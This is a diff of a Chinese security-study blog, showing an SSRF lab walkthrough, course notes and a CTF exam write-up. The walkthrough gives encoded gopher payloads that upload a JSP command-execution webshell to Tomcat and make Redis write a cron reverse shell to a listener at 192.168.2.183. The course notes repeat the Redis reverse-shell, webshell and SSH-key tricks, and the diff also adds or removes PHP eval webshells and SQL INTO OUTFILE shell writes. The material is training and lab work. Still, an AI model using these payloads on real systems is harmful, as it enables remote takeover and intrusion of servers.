38%25%37%34%25%36%64%25%36%63%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%36%25%36%39%25%36%36%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%37%37%25%36%35%25%36%32%25%37%30%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%30%25%36%65%25%36%37%25%32%63%25%32%61%25%32%66%25%32%61%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%33%25%36%39%25%36%37%25%36%65%25%36%35%25%36%34%25%32%64%25%36%35%25%37%38%25%36%33%25%36%38%25%36%31%25%36%65%25%36%37%25%36%35%25%33%62%25%37%36%25%33%64%25%36%32%25%33%33%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%37%25%30%64%25%30%61%25%35%32%25%36%35%25%36%36%25%36%35%25%37%32%25%36%35%25%37%32%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%32%25%32%65%25%33%31%25%33%38%25%33%33%25%33%61%25%33%38%25%33%30%25%33%38%25%33%38%25%32%66%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%62%25%36%35%25%36%35%25%37%30%25%32%64%25%36%31%25%36%63%25%36%39%25%37%36%25%36%35%25%30%64%25%30%61%25%30%64%25%30%61%25%36%39%25%37%30%25%33%64%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%62%25%36%39%25%36%34</span><br></pre></td></tr></table></figure>
+
+<h3><span id="内网172722326">内网172.72.23.26</span></h3><p>是个tomcat</p>
+<p><img src="/../assets/image_1735571171989_0.png" alt="image.png"></p>
+<p>尝试进行历史漏洞利用</p>
+<p>构造请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: 172.72.23.26:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 202</span><br><span class="line">&lt;% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1) out.print(new String(b, 0, a)); %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:%2f%2f172.72.23.26:8080/_%25%35%30%25%35%35%25%35%34%25%32%30%25%32%66%25%33%31%25%32%65%25%36%61%25%37%33%25%37%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%36%25%33%61%25%33%38%25%33%30%25%33%38%25%33%30%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%32%61%25%32%66%25%32%61%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%36%35%25%36%65%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%36%33%25%36%66%25%36%64%25%37%30%25%36%31%25%37%34%25%36%39%25%36%32%25%36%63%25%36%35%25%33%62%25%32%30%25%34%64%25%35%33%25%34%39%25%34%35%25%32%30%25%33%39%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%36%25%32%65%25%33%31%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%33%62%25%32%30%25%35%34%25%37%32%25%36%39%25%36%34%25%36%35%25%36%65%25%37%34%25%32%66%25%33%35%25%32%65%25%33%30%25%32%39%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%30%25%33%32%25%30%64%25%30%61%25%30%64%25%30%61%25%33%63%25%32%35%25%32%30%25%36%61%25%36%31%25%37%36%25%36%31%25%32%65%25%36%39%25%36%66%25%32%65%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%30%25%36%39%25%36%65%25%32%30%25%33%64%25%32%30%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%65%25%36%37%25%36%35%25%37%34%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%38%25%32%39%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%32%38%25%37%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%32%65%25%36%37%25%36%35%25%37%34%25%35%30%25%36%31%25%37%32%25%36%31%25%36%64%25%36%35%25%37%34%25%36%35%25%37%32%25%32%38%25%32%32%25%36%33%25%36%64%25%36%34%25%32%32%25%32%39%25%32%39%25%32%65%25%36%37%25%36%35%25%37%34%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%38%25%32%39%25%33%62%25%32%30%25%36%39%25%36%65%25%37%34%25%32%30%25%36%31%25%32%30%25%33%64%25%32%30%25%32%64%25%33%31%25%33%62%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%35%64%25%32%30%25%36%32%25%32%30%25%33%64%25%32%30%25%36%65%25%36%35%25%37%37%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%33%32%25%33%30%25%33%34%25%33%38%25%35%64%25%33%62%25%32%30%25%37%37%25%36%38%25%36%39%25%36%63%25%36%35%25%32%38%25%32%38%25%36%31%25%33%64%25%36%39%25%36%65%25%32%65%25%37%32%25%36%35%25%36%31%25%36%34%25%32%38%25%36%32%25%32%39%25%32%39%25%32%31%25%33%64%25%32%64%25%33%31%25%32%39%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%36%65%25%36%35%25%37%37%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%36%32%25%32%63%25%32%30%25%33%30%25%32%63%25%32%30%25%36%31%25%32%39%25%32%39%25%33%62%25%32%30%25%32%35%25%33%65%25%30%64%25%30%61</span><br></pre></td></tr></table></figure>
+
+<p>访问jsp</p>
+<p><img src="/../assets/image_1735571782172_0.png" alt="image.png"></p>
+<h3><span id="内网172722327">内网172.72.23.27</span></h3><p>端口为6379,尝试写计划任务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">terminal1</span></span><br><span class="line">nc -l 9900 -k -C &gt; payload</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">terminal2</span></span><br><span class="line">timeout 0.5 redis-cli -p 9900 CONFIG SET dir /var/spool/cron/</span><br><span class="line">timeout 0.5 redis-cli -p 9900 CONFIG SET dbfilename root</span><br><span class="line">timeout 0.5 redis-cli -p 9900 set test $&#x27;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.2.183/4444 0&gt;&amp;1\n&#x27;</span><br><span class="line">timeout 0.5 redis-cli -p 9900 SAVE</span><br></pre></td></tr></table></figure>
+
+<p>将payload中内容进行两次url编码即可获得payload</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:%2f%2f172.72.23.27:6379/_%25%32%61%25%33%34%25%30%64%25%30%61%25%32%34%25%33%36%25%30%64%25%30%61%25%34%33%25%34%66%25%34%65%25%34%36%25%34%39%25%34%37%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%35%33%25%34%35%25%35%34%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%36%34%25%36%39%25%37%32%25%30%64%25%30%61%25%32%34%25%33%31%25%33%36%25%30%64%25%30%61%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%33%25%37%30%25%36%66%25%36%66%25%36%63%25%32%66%25%36%33%25%37%32%25%36%66%25%36%65%25%32%66%25%30%64%25%30%61%25%32%61%25%33%34%25%30%64%25%30%61%25%32%34%25%33%36%25%30%64%25%30%61%25%34%33%25%34%66%25%34%65%25%34%36%25%34%39%25%34%37%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%35%33%25%34%35%25%35%34%25%30%64%25%30%61%25%32%34%25%33%31%25%33%30%25%30%64%25%30%61%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%32%61%25%33%33%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%37%34%25%36%35%25%37%33%25%37%34%25%30%64%25%30%61%25%32%34%25%33%36%25%33%32%25%30%64%25%30%61%25%30%61%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%66%25%36%32%25%36%39%25%36%65%25%32%66%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%32%30%25%33%65%25%32%36%25%32%30%25%32%66%25%36%34%25%36%35%25%37%36%25%32%66%25%37%34%25%36%33%25%37%30%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%32%25%32%65%25%33%31%25%33%38%25%33%33%25%32%66%25%33%34%25%33%34%25%33%34%25%33%34%25%32%30%25%33%30%25%33%65%25%32%36%25%33%31%25%30%61%25%30%61%25%30%64%25%30%61%25%30%64%25%30%61%25%30%64%25%30%61%25%32%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%35%33%25%34%31%25%35%36%25%34%35%25%30%64%25%30%61</span><br></pre></td></tr></table></figure>
+
+<h2><span id="参考">参考</span></h2><p><a target="_blank" rel="noopener" href="https://github.com/sqlsec/ssrf-vuls">GitHub sqlsec&#x2F;ssrf-vuls: 国光的手把手带你用 SSRF 打穿内网靶场源码</a></p>
+<p><a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/web/security-risk/ssrf/">SSRF (Server-Side Request Forgery) | Exploit Notes</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/20/upload-labs/" data-id="cm5vste5d002kfriwhxpwdovr" data-title="upload-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/12/30/ssrf-vuls/" data-id="cm6z08or30033y1iwaleihdls" data-title="ssrf-vuls" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
 
     </footer>
   </div>
@@ -518,159 +705,14 @@
 
 
   
-    <article id="post-day28_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-week7_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/12/18/day28_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-18T15:20:15.000Z" itemprop="datePublished">2024-12-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/18/day28_kls/">day28_kls</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="4202年还有跨域漏洞吗">4202年还有跨域漏洞吗</span></h3><p>条件苛刻。浏览器会拦截。</p>
-<p>条件：</p>
-<p>后端跨站请求配置宽松</p>
-<p>cookie需要是secure属性且<code>SameSite=None</code></p>
-<p>网站和攻击者都要为https</p>
-<h3><span id="文件上传">文件上传</span></h3><p>原因</p>
-<p>后端未做严格校验，导致用户上传恶意文件</p>
-<p>危害</p>
-<p>控制站点</p>
-<p>资源耗尽</p>
-<p>挖掘</p>
-<p>传就完事啦</p>
-<p>利用</p>
-<p>上传webshell</p>
-<p>防御</p>
-<p>限制文件类型</p>
-<p>限制文件大小</p>
-<p>使用oss存储</p>
-<p>存储与站点分离</p>
-<p>绕过防御</p>
-<h3><span id="php命令执行">php命令执行</span></h3><p>php命令执行相关函数</p>
-<p>eval</p>
-<p>assert</p>
-<p>preg_replace</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;jutst test&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>create_function</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> =<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="variable">$func</span>();</span><br></pre></td></tr></table></figure>
-
-<p>array_map</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br></pre></td></tr></table></figure>
-
-<p>array_filter</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br></pre></td></tr></table></figure>
-
-<p>php命令执行函数</p>
-<p>system</p>
-<p>exec</p>
-<p>popen</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10819069.html">php中代码执行&amp;&amp;命令执行函数 卿先生 博客园</a></p>
-<h3><span id="webshell管理器">webshell管理器</span></h3><h4><span id="蚁剑">蚁剑</span></h4><p>流量裸奔</p>
-<h4><span id="哥斯拉">哥斯拉</span></h4><p>流量特征明显</p>
-<h4><span id="冰蝎">冰蝎</span></h4><p>流量特征基本发现不了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/18/day28_kls/" data-id="cm5vste53001ffriw6uf99fqi" data-title="day28_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cors/" rel="tag">cors</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-day27_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/17/day27_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-17T14:59:10.000Z" itemprop="datePublished">2024-12-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/17/day27_kls/">day27_kls</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="csrf">csrf</span></h3><p>原因</p>
-<p>请求参数未经严格校验，使得请求可以被伪造</p>
-<p>危害</p>
-<p>诱导用户执行非本意的操作</p>
-<p>盗号</p>
-<p>诱使用户发送政治敏感信息</p>
-<p>ddos</p>
-<p>挖掘</p>
-<p>能看懂所有的请求，就说明存在csrf</p>
-<p>利用</p>
-<p>使用bp构造csrf poc</p>
-<p>引用js直接发送ajax请求</p>
-<p>防御</p>
-<p>加入可变参数</p>
-<p>让请求参数不可读(人不可读)</p>
-<p>绕过防御</p>
-<p>做一个模仿者</p>
-<h3><span id="csrfxss">csrf+xss</span></h3><p>组合拳，使用xss，让用户伪造请求。</p>
-<h3><span id="jsonp">jsonp</span></h3><p>jsonp本是一种开发中的技巧。为了逃避同源策略。</p>
-<p>大家有时候用这种骚操作去传敏感信息，但没鉴权，导致敏感信息泄漏。</p>
-<h4><span id="应用">应用</span></h4><p>蜜罐获取攻击者信息</p>
-<p>蜜罐通过各个社交网站的jsonp漏洞，获取攻击者的社交媒体信息</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/17/day27_kls/" data-id="cm5vste52001bfriw1i4h5xaz" data-title="day27_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/csrf/" rel="tag">csrf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-day26_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/16/day26_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-16T14:42:19.000Z" itemprop="datePublished">2024-12-16</time>
+    <a href="/2024/12/27/week7_kls_exam/" class="article-date">
+  <time class="dt-published" datetime="2024-12-27T08:02:04.000Z" itemprop="datePublished">2024-12-27</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
+    <a class="article-category-link" href="/categories/exam/">exam</a>
   </div>
 
   </div>
@@ -681,7 +723,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/16/day26_kls/">day26_kls</a>
+      <a class="p-name article-title" href="/2024/12/27/week7_kls_exam/">week7_kls_exam</a>
     </h1>
   
 
@@ -689,161 +731,110 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="sql注入写webshell">sql注入写webshell</span></h3><p>写文件</p>
-<p><code>SELECT &#39;&lt;!--?php @eval($_POST[&quot;cmd&quot;]); ?--&gt;&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39;;</code></p>
+        <h2><span id="题目1">题目1</span></h2><p>看上去有报错注入，直接梭哈</p>
+<p><img src="/../assets/image_1735277473884_0.png" alt="image.png"></p>
+<p>数据库里有密码</p>
+<p><img src="/../assets/image_1735278845382_0.png" alt="image.png"></p>
+<p>登陆后发现存在命令执行</p>
+<p><img src="/../assets/image_1735278869319_0.png" alt="image.png"></p>
+<p><code>flag&#123;596cc5eb82d76a731492b37e772b4eea&#125;</code></p>
+<h2><span id="题目2">题目2</span></h2><p>有密码直接登陆</p>
+<p><img src="/../assets/image_1735280186592_0.png" alt="image.png"></p>
+<p>发现了文件包含</p>
+<p><img src="/../assets/image_1735280149615_0.png" alt="image.png"></p>
+<p>文件包含直接干</p>
+<p><img src="/../assets/image_1735286641928_0.png" alt="image.png"></p>
+<p><code>flag&#123;c2dde9962b21827fe0a7fcf6d4fc9676&#125;</code></p>
+<h2><span id="题目3">题目3</span></h2><p>告诉俺flag在这里，直接开干</p>
+<p>读文件</p>
+<p><img src="/../assets/image_1735287007670_0.png" alt="image.png"></p>
+<p>解码</p>
+<p><img src="/../assets/image_1735287034731_0.png" alt="image.png"></p>
+<p><code>$flag = flag&#123;b2bf768baf961050658884ca2632fc73&#125;</code></p>
+<h2><span id="题目4">题目4</span></h2><p>扫到了残存的swp</p>
+<p><img src="/../assets/image_1735280862730_0.png" alt="image.png"></p>
+<p>恢复出来是这样</p>
+<p><img src="/../assets/image_1735280848301_0.png" alt="image.png"></p>
+<p>尝试利用php历史漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1735284829042_0.png" alt="image.png"></p>
+<p><code>flag&#123;38e225d12d7dd49b84e5a06baf55b30d&#125;</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/27/week7_kls_exam/" data-id="cm6z08or8003qy1iwdammhtaz" data-title="week7_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-day34_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/26/day34_kls/" class="article-date">
+  <time class="dt-published" datetime="2024-12-26T15:05:22.000Z" itemprop="datePublished">2024-12-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/12/26/day34_kls/">day34_kls</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="课程内容">课程内容</span></h2><h3><span id="redis">redis</span></h3><p>写webshell</p>
+<p>利用持久化存储写webshell<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /var/www/html</span><br><span class="line">CONFIG SET dbfilename shell.php</span><br><span class="line">SET test &quot;&lt;!--?php system($_GET[&#x27;cmd&#x27;]); ?--&gt;&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure></p>
+<p>写计划任务</p>
 <p>利用条件</p>
-<p>secure-file-priv为空或为能够访问到的目录</p>
-<h3><span id="sql注入日志写webshell">sql注入日志写webshell</span></h3><p>开启mysql日志记录</p>
-<p><code>set GLOBAL general_log = on;</code></p>
-<p>修改mysql的基础日志文件保存位置&#x2F;var&#x2F;www&#x2F;html&#x2F;xxxx.php</p>
-<p><code>set GLOBAL general_log_file = &quot;/var/www/html/6666.php&quot;;</code></p>
-<h3><span id="xss">xss</span></h3><p>分类</p>
-<p>反射型</p>
-<p>存储型</p>
-<p>dom型</p>
-<p>xxe</p>
-<p>原因</p>
-<p>后端未经严格验证导致用户可控的输入传给前端，造成输入被解析为js</p>
-<p>危害</p>
-<p>窃取用户敏感信息</p>
-<p>劫持浏览器</p>
-<p>记录用户输入</p>
-<p>挖掘</p>
-<p>白盒</p>
+<p>目标机器为centos系列</p>
+<p>cetnos系列cron会略过错误的行</p>
+<p>原理与写webshell相同<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /var/spool/cron/</span><br><span class="line">CONFIG SET dbfilename root</span><br><span class="line">set test &quot;\n\n\n * * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.2.183/9999 0&gt;&amp;1  \n\n\n&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure></p>
+<p>写ssh public key</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /root/.ssh/</span><br><span class="line">CONFIG SET dbfilename authorized_keys</span><br><span class="line">set test &quot;\n\n\n your_key\n\n&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure>
+
+<h3><span id="ssrf">ssrf</span></h3><h4><span id="原因">原因</span></h4><p>开发者未对用户可控的url进行限制，导致服务器请求到恶意的url</p>
+<h4><span id="危害">危害</span></h4><p>内网探测</p>
+<p>信息泄漏</p>
+<h4><span id="挖掘">挖掘</span></h4><p>白盒</p>
+<p>是否存在用户可控的服务器访问url</p>
 <p>黑盒</p>
-<p>bp一顿扫</p>
-<p>利用</p>
-<p>反射型</p>
-<p>通过短链接的方式让用户执行恶意script</p>
-<p>存储型</p>
-<p>等待被害者上钩</p>
-<p>dom型</p>
-<p>同反射型</p>
-<p>常用payload</p>
-<p><code>![](xxx)</code></p>
-<p>防御</p>
-<p>上waf</p>
-<p>前端过滤</p>
-<p>后端过滤</p>
-<p>绕过防御</p>
+<p>参数中存在url就可劲干</p>
+<p>验证是否存在漏洞</p>
+<p>http</p>
+<p>dnslog</p>
